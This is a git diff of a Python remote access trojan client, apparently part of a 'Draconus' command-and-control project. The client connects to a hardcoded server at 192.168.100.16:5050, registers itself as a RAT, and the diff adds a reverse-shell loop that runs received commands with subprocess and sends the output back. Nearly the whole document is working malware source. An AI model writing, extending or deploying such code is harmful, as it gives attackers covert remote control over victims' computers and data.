@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 SERVER = '192.168.100.16'
 PORT = 5050
@@ -11,7 +12,6 @@ RAW_LEN = 256
 
 # length of output message (4 kb)
 OUT_LEN = 4096
-
 
 # length of response message (1 bytes)
 RAW_ERROR = 1
@@ -25,15 +25,21 @@ TYPE_RAT = 'RAT'
 # message to disconnect
 MSG_DISC = 'MSG_DISC'
 
-# message uses to send response (it is OK)
-MSG_OK = 'MSG_OK'
+# prepare to send Message
+TYPE_MSG = 'TYPE_MSG'
+
+# message to start shell
+SHELL_START = 'SHELL START'
 
 # message to exit the shell
 SHELL_EXIT = 'EXIT'
 
 class Msg:
     def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
-        self.pmsg = msg
+        if msg == '':
+            self.pmsg = '0'
+        else:
+            self.pmsg = msg
         self.formats = formats
         if len(msg) > raw_len:
             self.raw_len = len(msg)
@@ -41,12 +47,12 @@ class Msg:
             self.raw_len = raw_len
         
         self.msg = self.make(self.pmsg)
-        self.len = self.make(len(self.pmsg), raw_len=RAW_LEN)
+        self.len = self.make(len(self.pmsg), raw_len=self.raw_len)
       
 
     def make(self, msg, raw_len=None):
         nmsg = str(msg).encode(self.formats)
-        if len(nmsg) < self.raw_len:
+        if len(nmsg) < RAW_LEN:
             raw_len = RAW_LEN
         else:
             raw_len = self.raw_len
@@ -98,35 +104,98 @@ class Rat:
             pass
         return output
 
-    # send output message to Draconus. Result of command
-    # default length 4kb
+    
+    
+    
+
     def send_output(self, msg):
-        output = Msg(msg, raw_len=OUT_LEN)
-        try:
-            self.RAT.send(output.msg)
-        except:
-            pass
-        try:
-            self.RAT.recv(RAW_ERROR)
-        except:
-            pass
+        send = msg.encode(FORMAT)
+        len_send = str(len(send))
+        self.send_pocket(len_send)
+        self.RAT.send(send)
+
+
+
+        
 
 
     def hello_world(self):
         self.send_pocket(TYPE_RAT)
 
+    # def recive_orders(self):
+    #     order = None
+    #     while order != MSG_DISC:
+    #         order = self.recive_pocket()
+    #         if order:
+    #             if order == SHELL_START:
+    #                 self.send_output(SHELL_START)
+            
+    #                 while order != SHELL_EXIT:
+    #                     cwd = os.getcwd()
+    #                     self.send_output(cwd)
+    #                     order = self.recive_pocket()
+    #                     if order.startswith('cd '):
+    #                         try:
+    #                             os.chdir(order[3:])
+    #                             self.send_output('change directory succesfull')
+    #                         except:
+    #                             self.send_output(' <change directory> ERROR !!')
+
+    #                     elif order == SHELL_EXIT:
+    #                         self.send_output('disconnect ... Bye Bye ....')   
+    #                     else:
+    #                         out = self.run_cmd(order)
+    #                         self.send_output('SHELL Result:\n' + out)
+                
+    #             else:
+    #                 self.send_output('Unknown command')
+
+
+    def reverse_cmd(self):
+        self.send_pocket('SHELL starting ...')
+        command = None
+        while command != SHELL_EXIT:
+            cwd = os.getcwd()
+            self.send_pocket(cwd)
+            command = self.recive_pocket()
+            print('command: ', command)
+            if command.startswith('cd '):
+                try:
+                    os.chdir(command[3:])
+                    self.send_output('Change Directory Sucessfull !!!')
+                    continue
+                except:
+                    self.send_output(' ERROR when < change directory function >')
+                    continue
+            output = self.run_cmd(command)
+            self.send_output(output)
+            
+
     def recive_orders(self):
         order = None
-        while order != SHELL_EXIT:
+        while order != MSG_DISC:
             order = self.recive_pocket()
-            out = self.run_cmd(order)
-            self.send_output(out)
+            if order:
+                print('ORDER: ', order)
+                if order == SHELL_START:
+                    self.reverse_cmd()
+                else:
+                    self.send_pocket('Unknown Command')
+
+
+
 
     def run_cmd(self, command):
         try:
             out = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-            return out.stdout
+            if out.returncode == 0:
+                print('LEN: ', len(out.stdout))
+                
+                return out.stdout
+            else:
+                error = 'ERROR:\n' + out.stderr
+                return error
         except:
             out = 'Error'
             return out
@@ -137,9 +206,18 @@ class Rat:
 
 
 #### START
+
+x = ''
+for a in range(34435):
+    x += 'dfgry6546*%$'
+
+print('LEN X: ', len(x), ' Bytes **  ', int(float(len(x)/1024)), ' KB')
+
+
 RAT = Rat()
 RAT.connect()
 RAT.hello_world()
+
 RAT.recive_orders()
 
 
